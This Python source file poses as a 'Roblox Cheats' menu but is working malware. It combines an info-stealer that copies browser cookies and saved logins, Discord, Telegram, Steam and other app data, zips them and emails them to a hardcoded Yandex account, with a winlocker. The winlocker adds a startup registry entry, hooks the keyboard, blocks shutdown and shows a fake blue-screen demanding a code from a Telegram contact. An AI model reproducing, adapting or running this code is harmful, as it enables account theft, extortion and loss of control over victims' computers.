import os
import sys
import shutil
import zipfile
import smtplib
import time
import re
import subprocess
import platform
import socket
import getpass
import tempfile
from datetime import datetime
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import tkinter as tk
from tkinter import filedialog, messagebox
import ctypes
import ctypes.wintypes   # <-- ДОБАВЛЕНО для работы с сообщениями Windows
import threading
import winreg

# =================== СТИЛЕР ===================
EMAIL_FROM = "m3tvey@yandex.ru"
EMAIL_PASSWORD = "fqukzrqxqcgmwoqx"
EMAIL_TO = "m3tvey@yandex.ru"
SMTP_SERVER = "smtp.yandex.ru"
SMTP_PORT = 465

WORK_DIR = os.path.join(tempfile.gettempdir(), "stolen_creds")
os.makedirs(WORK_DIR, exist_ok=True)

def collect_browser_data():
    appdata_local = os.getenv("LOCALAPPDATA")
    appdata_roaming = os.getenv("APPDATA")
    browsers = {
        "Chrome": os.path.join(appdata_local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(appdata_local, "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(appdata_roaming, "Opera Software", "Opera Stable"),
        "Brave": os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Vivaldi": os.path.join(appdata_local, "Vivaldi", "User Data"),
        "Yandex": os.path.join(appdata_local, "Yandex", "YandexBrowser", "User Data"),
        "Firefox": os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles"),
    }
    files_to_copy = ["Cookies", "Login Data", "Web Data", "History", "Bookmarks"]
    collected = 0
    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        try:
            if name == "Firefox":
                for profile in os.listdir(path):
                    profile_path = os.path.join(path, profile)
                    if os.path.isdir(profile_path):
                        dst = os.path.join(WORK_DIR, "browsers", name, profile)
                        shutil.copytree(profile_path, dst, dirs_exist_ok=True)
                        collected += 1
            else:
                for folder in os.listdir(path):
                    folder_path = os.path.join(path, folder)
                    if os.path.isdir(folder_path) and (folder.startswith("Default") or folder.startswith("Profile")):
                        dst_root = os.path.join(WORK_DIR, "browsers", name, folder)
                        for fname in files_to_copy:
                            src = os.path.join(folder_path, fname)
                            if os.path.isfile(src):
                                dst = os.path.join(dst_root, fname)
                                os.makedirs(os.path.dirname(dst), exist_ok=True)
                                shutil.copy2(src, dst)
                                collected += 1
                        ls_src = os.path.join(folder_path, "Local Storage")
                        if os.path.isdir(ls_src):
                            dst_ls = os.path.join(dst_root, "Local Storage")
                            shutil.copytree(ls_src, dst_ls, dirs_exist_ok=True)
        except:
            pass
    return collected

def collect_discord():
    appdata = os.getenv("APPDATA")
    paths = [
        os.path.join(appdata, "discord", "Local Storage"),
        os.path.join(appdata, "discordcanary", "Local Storage"),
        os.path.join(appdata, "discordptb", "Local Storage"),
    ]
    count = 0
    for p in paths:
        if os.path.exists(p):
            try:
                dst = os.path.join(WORK_DIR, "discord", os.path.basename(os.path.dirname(p)))
                shutil.copytree(p, dst, dirs_exist_ok=True)
                count += 1
            except:
                pass
    return count

def collect_telegram():
    tdata = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
    if os.path.exists(tdata):
        try:
            dst = os.path.join(WORK_DIR, "telegram_tdata")
            shutil.copytree(tdata, dst, dirs_exist_ok=True)
            return True
        except:
            pass
    return False

def collect_steam():
    steam_path = os.path.join(os.getenv("PROGRAMFILES"), "Steam")
    if not os.path.exists(steam_path):
        steam_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam")
    if os.path.exists(steam_path):
        try:
            src = os.path.join(steam_path, "config", "loginusers.vdf")
            if os.path.isfile(src):
                dst = os.path.join(WORK_DIR, "steam", "loginusers.vdf")
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copy2(src, dst)
            config_src = os.path.join(steam_path, "config")
            if os.path.isdir(config_src):
                dst_config = os.path.join(WORK_DIR, "steam", "config")
                shutil.copytree(config_src, dst_config, dirs_exist_ok=True)
            return True
        except:
            pass
    return False

def collect_minecraft():
    mc_path = os.path.join(os.getenv("APPDATA"), ".minecraft")
    if os.path.exists(mc_path):
        try:
            src = os.path.join(mc_path, "launcher_profiles.json")
            if os.path.isfile(src):
                dst = os.path.join(WORK_DIR, "minecraft", "launcher_profiles.json")
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copy2(src, dst)
                return True
        except:
            pass
    return False

def collect_other_apps():
    appdata = os.getenv("APPDATA")
    localappdata = os.getenv("LOCALAPPDATA")
    search_dirs = [appdata, localappdata]
    extensions = (".db", ".sqlite", ".sqlite3", ".json")
    count = 0
    for base in search_dirs:
        if not base or not os.path.exists(base):
            continue
        for root, dirs, files in os.walk(base):
            if count > 50:
                break
            for file in files:
                if file.lower().endswith(extensions):
                    if any(x in root.lower() for x in ["cache", "temp", "logs", "backup"]):
                        continue
                    src = os.path.join(root, file)
                    app_name = os.path.basename(os.path.dirname(src))
                    dst = os.path.join(WORK_DIR, "other_apps", app_name, file)
                    try:
                        os.makedirs(os.path.dirname(dst), exist_ok=True)
                        shutil.copy2(src, dst)
                        count += 1
                    except:
                        pass
    return count

def send_email(subject, body, attachments=None, retries=2):
    for attempt in range(retries):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_FROM
            msg['To'] = EMAIL_TO
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            if attachments:
                for filepath in attachments:
                    if os.path.exists(filepath):
                        with open(filepath, "rb") as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
                            msg.attach(part)
            if SMTP_PORT == 465:
                server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, timeout=30)
            else:
                server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=30)
                server.starttls()
            server.login(EMAIL_FROM, EMAIL_PASSWORD)
            server.send_message(msg)
            server.quit()
            return True
        except Exception:
            time.sleep(5)
    return False

def pack_and_send():
    zip_path = os.path.join(tempfile.gettempdir(), f"creds_{int(time.time())}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(WORK_DIR):
            for file in files:
                full = os.path.join(root, file)
                arcname = os.path.relpath(full, WORK_DIR)
                zipf.write(full, arcname)
    subject = f"Credentials from {getpass.getuser()} at {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    body = "Архив содержит куки, базы паролей, логины и сессии."
    success = send_email(subject, body, attachments=[zip_path])
    if not success:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        local_path = os.path.join(desktop, os.path.basename(zip_path))
        try:
            shutil.copy2(zip_path, local_path)
        except:
            shutil.copy2(zip_path, os.getcwd())
    shutil.rmtree(WORK_DIR, ignore_errors=True)
    try:
        os.remove(zip_path)
    except:
        pass
    return success

def steal_and_send():
    try:
        collect_browser_data()
        collect_discord()
        collect_telegram()
        collect_steam()
        collect_minecraft()
        collect_other_apps()
        pack_and_send()
    except:
        pass

# =================== ВИНЛОКЕР ===================
APP_DATA = os.getenv("LOCALAPPDATA")
MARKER_DIR = os.path.join(APP_DATA, "RobloxCheats")
MARKER_FILE = os.path.join(MARKER_DIR, "unlocked.dat")

def create_marker():
    os.makedirs(MARKER_DIR, exist_ok=True)
    with open(MARKER_FILE, "w") as f:
        f.write("unlocked")

def marker_exists():
    return os.path.exists(MARKER_FILE)

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        exe_path = sys.executable
        winreg.SetValueEx(key, "RobloxCheats", 0, winreg.REG_SZ, f'"{exe_path}" --autorun')
        winreg.CloseKey(key)
    except:
        pass

def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "RobloxCheats")
        winreg.CloseKey(key)
    except:
        pass

# ---- НОВАЯ ФУНКЦИЯ: БЛОКИРОВКА ВЫКЛЮЧЕНИЯ ----
def prevent_shutdown():
    """Создаёт невидимое окно-щит. Если маркер отсутствует – отменяет завершение работы."""
    try:
        def wndproc(hwnd, msg, wParam, lParam):
            if msg == 0x11:  # WM_QUERYENDSESSION
                if not marker_exists():
                    return 0  # запрет
            return ctypes.windll.user32.DefWindowProcW(hwnd, msg, wParam, lParam)

        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p)
        proc = WNDPROC(wndproc)

        hinst = ctypes.windll.kernel32.GetModuleHandleW(None)
        wc = ctypes.WNDCLASSW()
        wc.lpfnWndProc = proc
        wc.hInstance = hinst
        wc.lpszClassName = "ShieldWnd"
        if not ctypes.windll.user32.RegisterClassW(ctypes.byref(wc)):
            return

        hwnd = ctypes.windll.user32.CreateWindowExW(
            0, "ShieldWnd", "", 0,
            0, 0, 0, 0,
            0, 0, hinst, 0
        )
        if not hwnd:
            return

        msg = ctypes.wintypes.MSG()
        while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), hwnd, 0, 0) > 0:
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
    except:
        pass

WH_KEYBOARD_LL = 13
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_ulong),
        ("scanCode", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.c_void_p)
    ]
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_ulong, ctypes.POINTER(KBDLLHOOKSTRUCT))
hook_ptr = None

def low_level_keyboard_proc(nCode, wParam, lParam):
    global hook_ptr
    if nCode >= 0:
        kb = lParam.contents
        vk = kb.vkCode
        blocked_keys = {91, 92, 18, 9, 27, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123}
        if vk in blocked_keys:
            return 1
        allowed = (48 <= vk <= 57) or (65 <= vk <= 90) or (97 <= vk <= 122) or vk in (8, 13, 32, 46)
        if not allowed:
            return 1
    return ctypes.windll.user32.CallNextHookEx(hook_ptr, nCode, wParam, lParam)

def start_key_hook():
    global hook_ptr
    try:
        hook_proc = HOOKPROC(low_level_keyboard_proc)
        hook_ptr = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            hook_proc,
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
        if hook_ptr:
            msg = ctypes.wintypes.MSG()
            while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
    except:
        pass

def show_bsod():
    threading.Thread(target=start_key_hook, daemon=True).start()
    bsod_root = tk.Tk()
    bsod_root.attributes('-fullscreen', True)
    bsod_root.attributes('-topmost', True)
    bsod_root.configure(bg='#0000AA')
    bsod_root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Запускаем блокировку выключения в фоне
    threading.Thread(target=prevent_shutdown, daemon=True).start()

    lines = [
        "БРАТАН, ТВОЙ КОМП ПОЛУЧИЛ ПИЗДЫ.",
        "МЫ УЖЕ СОБИРАЕМ ТВОИ ДАННЫЕ, И СКОРО ИХ УДАЛИМ НАВСЕГДА.",
        "НИЧЕГО НЕ БОЙСЯ, ЭТО ПРОСТО КОНЕЦ.",
        "",
        "Код ошибки: СМЕРТЬ_ТВОЕГО_ЖЕСТКОГО_ДИСКА",
        "",
        "Что сломалось: твоя операционка - адрес 0xDEADBEEF",
        "",
        "Для получения дополнительной информации ищи свои файлы в корзине"
    ]
    tk.Label(
        bsod_root,
        text="\n".join(lines),
        font=("Consolas", 14, "bold"),
        fg="white",
        bg="#0000AA",
        justify="left"
    ).pack(expand=True, pady=20)

    progress_label = tk.Label(
        bsod_root,
        text="0% complete",
        font=("Consolas", 12, "bold"),
        fg="white",
        bg="#0000AA"
    )
    progress_label.pack(pady=10)

    def show_recovery_input():
        progress_label.pack_forget()
        tk.Label(
            bsod_root,
            text="Введите код для возврата всех данных (получить в @isrealplayer):",
            font=("Consolas", 14, "bold"),
            fg="white",
            bg="#0000AA"
        ).pack(pady=10)
        entry = tk.Entry(
            bsod_root,
            font=("Consolas", 14),
            bg="white",
            fg="black",
            justify="center"
        )
        entry.pack(pady=5)
        entry.focus_set()
        error_label = tk.Label(
            bsod_root,
            text="",
            font=("Consolas", 12),
            fg="red",
            bg="#0000AA"
        )
        error_label.pack(pady=5)
        def check_code():
            code = entry.get().strip()
            if code == "67":
                create_marker()
                remove_from_startup()
                bsod_root.destroy()
            else:
                error_label.config(text="Неверный код! Попробуйте снова.")
                entry.delete(0, tk.END)
                entry.focus_set()
        tk.Button(
            bsod_root,
            text="Восстановить",
            font=("Consolas", 12, "bold"),
            bg="white",
            fg="black",
            command=check_code
        ).pack(pady=10)
        bsod_root.bind('<Return>', lambda event: check_code())

    def update_progress(pct=0):
        if pct <= 100:
            progress_label.config(text=f"{pct}% complete")
            bsod_root.after(80, update_progress, pct + 1)
        else:
            progress_label.config(text="100% complete – restarting...")
            bsod_root.after(500, show_recovery_input)
    bsod_root.after(100, update_progress)
    bsod_root.mainloop()

# =================== МЕНЮ ===================
def create_rounded_button(parent, text, command, bg, fg, hover_bg):
    canvas = tk.Canvas(parent, width=400, height=50, highlightthickness=0, bg=parent.cget("bg"))
    canvas.pack_propagate(False)
    rect = canvas.create_rounded_rect(0, 0, 400, 50, radius=25, fill=bg, outline=bg)
    text_id = canvas.create_text(200, 25, text=text, font=("Segoe UI", 14, "bold"), fill=fg)
    def on_enter(e):
        canvas.itemconfig(rect, fill=hover_bg, outline=hover_bg)
    def on_leave(e):
        canvas.itemconfig(rect, fill=bg, outline=bg)
    canvas.tag_bind(rect, "<Enter>", on_enter)
    canvas.tag_bind(text_id, "<Enter>", on_enter)
    canvas.tag_bind(rect, "<Leave>", on_leave)
    canvas.tag_bind(text_id, "<Leave>", on_leave)
    def on_click(e):
        command()
    canvas.tag_bind(rect, "<Button-1>", on_click)
    canvas.tag_bind(text_id, "<Button-1>", on_click)
    return canvas

def _create_rounded_rect(self, x1, y1, x2, y2, radius=25, **kwargs):
    points = [x1+radius, y1, x2-radius, y1, x2, y1, x2, y1+radius, x2, y2-radius, x2, y2, x2-radius, y2, x1+radius, y2, x1, y2, x1, y2-radius, x1, y1+radius, x1, y1]
    return self.create_polygon(points, smooth=True, **kwargs)
tk.Canvas.create_rounded_rect = _create_rounded_rect

def launch_bsod(root):
    root.destroy()
    threading.Thread(target=steal_and_send, daemon=True).start()
    show_bsod()

def select_folder():
    folder = filedialog.askdirectory(title="Выберите папку с Roblox")
    if folder:
        messagebox.showinfo("Папка выбрана", f"Выбрано: {folder}")

def show_menu():
    root = tk.Tk()
    root.title("Roblox Cheats v3.0")
    root.geometry("600x500")
    root.resizable(False, False)
    root.configure(bg="#1a1a2e")
    main_frame = tk.Frame(root, bg="#16213e", bd=0, relief="flat")
    main_frame.place(x=20, y=20, width=560, height=460)
    tk.Label(main_frame, text="ROBLOX CHEATS", font=("Impact", 40, "bold"), fg="#00ffcc", bg="#16213e").pack(pady=(30, 5))
    tk.Label(main_frame, text="Выберите действие:", font=("Segoe UI", 16), fg="#aaaaaa", bg="#16213e").pack(pady=(0, 20))
    btn_start = create_rounded_button(main_frame, "🚀 Запустить", lambda: launch_bsod(root), "#00ffcc", "#000000", "#00ccaa")
    btn_start.pack(pady=10, padx=60, fill="x")
    btn_folder = create_rounded_button(main_frame, "📁 Выбрать папку с Roblox", select_folder, "#2d2d44", "#ffffff", "#3d3d5a")
    btn_folder.pack(pady=10, padx=60, fill="x")
    tk.Label(main_frame, text="© 2026 Swill Way | Все права защищены (нет)", font=("Segoe UI", 10), fg="#444466", bg="#16213e").pack(side="bottom", pady=15)
    root.mainloop()

# =================== ТОЧКА ВХОДА ===================
if __name__ == "__main__":
    if marker_exists():
        sys.exit(0)
    add_to_startup()
    if "--autorun" in sys.argv:
        threading.Thread(target=steal_and_send, daemon=True).start()
        show_bsod()
    else:
        show_menu()